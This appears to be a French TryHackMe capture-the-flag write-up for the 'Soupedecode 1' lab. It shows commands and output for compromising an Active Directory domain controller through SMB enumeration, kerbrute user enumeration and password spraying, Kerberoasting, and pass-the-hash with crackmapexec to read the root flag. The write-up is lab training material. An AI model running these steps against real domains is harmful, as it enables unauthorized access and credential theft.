@@ -1,0 +1,293 @@
+======== SOUPE DECODE 1 - TRY HACK ME WRITEUP =======
+
+
+ADRESSE IP :10.81.133.107
+NIVEAU : FACILE
+
+1 - RECONNAISSANCE 
+
+C'est une activedirectory, on va donc procéder étape par étape
+
+Instruction : Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting authentication, navigating through shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.
+
+Nom de domaine : SOUPEDECODE.LOCAL
+
+Nom NetBIOS : SOUPEDECODE
+
+Contrôleur de domaine : DC01.SOUPEDECODE.LOCAL
+
+Système : Windows Server, version 10.0.20348.
+
+Signature SMB : activée et obligatoire.
+
+On va donc commencer l'énumération du SMB 
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ nxc smb 10.81.133.107                                          3m15s
+SMB         10.81.133.107   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
+
+Avec l'utilisateur guest avec le mot de passe "", on a 
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ nxc smb 10.81.133.107 -u 'guest' -p '' --shares                  14s
+SMB         10.81.133.107   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
+SMB         10.81.133.107   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+SMB         10.81.133.107   445    DC01             [*] Enumerated shares
+SMB         10.81.133.107   445    DC01             Share           Permissions     Remark
+SMB         10.81.133.107   445    DC01             -----           -----------     ------
+SMB         10.81.133.107   445    DC01             ADMIN$                          Remote Admin
+SMB         10.81.133.107   445    DC01             backup                          
+SMB         10.81.133.107   445    DC01             C$                              Default share
+SMB         10.81.133.107   445    DC01             IPC$            READ            Remote IPC
+SMB         10.81.133.107   445    DC01             NETLOGON                        Logon server share 
+SMB         10.81.133.107   445    DC01             SYSVOL                          Logon server share 
+SMB         10.81.133.107   445    DC01             Users                           
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$                                                                                                33s
+
+c'est essentiel, on peut donc lire IPC
+
+On a confirmé notre hypothèse avec smbmap 
+[+] IP: 10.81.133.107:445	Name: 10.81.133.107       	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	backup                                            	NO ACCESS	
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	SYSVOL                                            	NO ACCESS	Logon server share 
+	Users                                             	NO ACCESS
+
+On est entré, mais on ne pourra pas faire grande choses
+
+on va donc énumerer les regles avec nxc smb 10.81.133.107 -u 'guest' -p '' --pass-pol
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ nxc smb 10.81.133.107 -u 'guest' -p '' --pass-pol                                             1m3s
+SMB         10.81.133.107   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
+SMB         10.81.133.107   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+
+On va maintenant chercher des utilisateurs via le kerberroatsing avec kerbrute 
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ kerbrute userenum \
+  --dc 10.81.133.107 \
+  -d SOUPEDECODE.LOCAL \
+  usernames.txt          
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/22/26 - Ronnie Flathers @ropnop
+
+2026/10/22 16:56:52 >  Using KDC(s):
+2026/10/22 16:56:52 >  	10.81.133.107:88
+
+2026/10/22 16:57:20 >  [+] VALID USERNAME:	administrator@SOUPEDECODE.LOCAL
+2026/10/22 17:03:44 >  [+] VALID USERNAME:	charlie@SOUPEDECODE.LOCAL
+
+ensuite, on va le tester avec GetNPUsers.py
+
+mais on n'a pas eu d'utilisateur essentielle.
+
+On a donc essayer d'énumerer avec lookupsid.py et on a trouvé des 2168 utilisateur intéressant 
+
+BIngo ! on a eu 900+ utilisateurs qu'on peut utiliser 
+
+On va donc faire un password spray avec kerbrute et ses utilisateurs trouvé 
+kerbrute passwordspray \
+  --dc 10.81.133.107 \
+  -d SOUPEDECODE.LOCAL \
+  --safe \
+  --user-as-pass \
+  domain_users.txt
+
+
+  bingo, on a eu notre premier valide login ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ kerbrute passwordspray \                                                                       37s
+  --dc 10.81.133.107 \
+  -d SOUPEDECODE.LOCAL \
+  --user-as-pass \
+  domain_users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/22/26 - Ronnie Flathers @ropnop
+
+2026/10/22 17:52:42 >  Using KDC(s):
+2026/10/22 17:52:42 >  	10.81.133.107:88
+
+2026/10/22 17:53:50 >  [+] VALID LOGIN:	ybob317@SOUPEDECODE.LOCAL:ybob317
+2026/10/22 17:53:58 >  Done! Tested 968 logins (1 successes) in 75.772 seconds
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$          
+
+2026/10/22 17:53:50 >  [+] VALID LOGIN:	ybob317@SOUPEDECODE.LOCAL:ybob317
+2026/10/22 17:53:58 >  Done! Tested 968 logins (1 successes) in 75.772 seconds
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ nxc smb 10.81.133.107 -u 'ybob317' -p 'ybob317' -d SOUPEDECODE.LOCAL                         1m15s
+SMB         10.81.133.107   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
+SMB         10.81.133.107   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ nxc smb 10.81.133.107 -u 'ybob317' -p 'ybob317' -d SOUPEDECODE.LOCAL domain_users.txt          11s
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─✘ $ smbmap -u "ybob317" -p "ybob317" -P 445 -H 10.81.133.107             
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.81.133.107:445	Name: soupedecode.local   	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	backup                                            	NO ACCESS	
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$      
+on va maintenant explorer le protocol smb via smbclient 
+
+et on a trouvé la flag sur le Desktop
+
+on va maintenant faire du kerberoasting avec spn
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ GetUserSPNs.py -request soupedecode.local/ybob317 -dc-ip 10.81.133.107 -outputfile roasted.txt
+
+et on l'a décodé avec john 
+
+on a eu un mot de passe et on va l'énumerer avec SPN 
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ GetUserSPNs.py 'SOUPEDECODE.LOCAL/ybob317:ybob317' \
+  -dc-ip 10.81.133.107
+
+  et on a les noms d'utilisateur essentielles
+
+  ────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ cat > TryThese.txt <<'EOF'
+file_svc
+firewall_svc
+backup_svc
+web_svc
+monitoring_svc
+EOF
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ nxc smb 10.81.133.107 \
+  -u TryThese.txt \
+  -p 'Password123!!' \
+  -d SOUPEDECODE.LOCAL
+SMB         10.81.133.107   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
+SMB         10.81.133.107   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$
+
+on a maintenant une piste
+
+on va extraire les hashs vers rawhashes.txt et avec trythese.txt (notre utilisateur actuel), on va utiliser crackmapexec 
+
+awk -F: '{print $4}' backup_extract.txt > RawHashes.txt
+
+on a eu un fichier de hash NTML qu'on va utiliser avec crackmapexec
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ crackmapexec smb 10.81.133.107 \                       
+  -u TryThese.txt \
+  -H RawHashes.txt \
+  -d soupedecode.local \
+  --continue-on-success
+
+  On a eu un résultat intéressant avec SMB         10.81.133.107   445    DC01             [+] soupedecode.local\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ crackmapexec smb 10.81.133.107 \
+  -u 'FileServer$' \
+  -H 'e41da7e79a4c76dbd9cf79d1cb325559' \
+  -d soupedecode.local \
+  --shares
+SMB         10.81.133.107   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:False)
+SMB         10.81.133.107   445    DC01             [+] soupedecode.local\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+SMB         10.81.133.107   445    DC01             [*] Enumerated shares
+SMB         10.81.133.107   445    DC01             Share           Permissions     Remark
+SMB         10.81.133.107   445    DC01             -----           -----------     ------
+SMB         10.81.133.107   445    DC01             ADMIN$          READ,WRITE      Remote Admin
+SMB         10.81.133.107   445    DC01             backup                          
+SMB         10.81.133.107   445    DC01             C$              READ,WRITE      Default share
+SMB         10.81.133.107   445    DC01             IPC$            READ            Remote IPC
+SMB         10.81.133.107   445    DC01             NETLOGON        READ,WRITE      Logon server share 
+SMB         10.81.133.107   445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.81.133.107   445    DC01             Users                           
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$  
+
+  IL dit qu'on a suffisament de privilège avec le file_server
+
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ crackmapexec smb 10.81.133.107 \
+  -u 'FileServer$' \
+  -H 'e41da7e79a4c76dbd9cf79d1cb325559' \
+  -d soupedecode.local \
+  --shares
+SMB         10.81.133.107   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:False)
+SMB         10.81.133.107   445    DC01             [+] soupedecode.local\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+SMB         10.81.133.107   445    DC01             [*] Enumerated shares
+SMB         10.81.133.107   445    DC01             Share           Permissions     Remark
+SMB         10.81.133.107   445    DC01             -----           -----------     ------
+SMB         10.81.133.107   445    DC01             ADMIN$          READ,WRITE      Remote Admin
+SMB         10.81.133.107   445    DC01             backup                          
+SMB         10.81.133.107   445    DC01             C$              READ,WRITE      Default share
+SMB         10.81.133.107   445    DC01             IPC$            READ            Remote IPC
+SMB         10.81.133.107   445    DC01             NETLOGON        READ,WRITE      Logon server share 
+SMB         10.81.133.107   445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.81.133.107   445    DC01             Users                           
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$  
+avec smbclient, on pourra donc naviguer vers C/Users/Administator/Desktop avec
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ smbclient //10.81.133.107/C$ \                                   41s
+  -U 'SOUPEDECODE.LOCAL/FileServer$' \
+  --pw-nt-hash
+Password for [SOUPEDECODE.LOCAL\FileServer$]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$ cat root.txt                                                     39s
+27cb2be302c388d63d27c86bfdd5f56a
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
+└─$
+
+
+
+
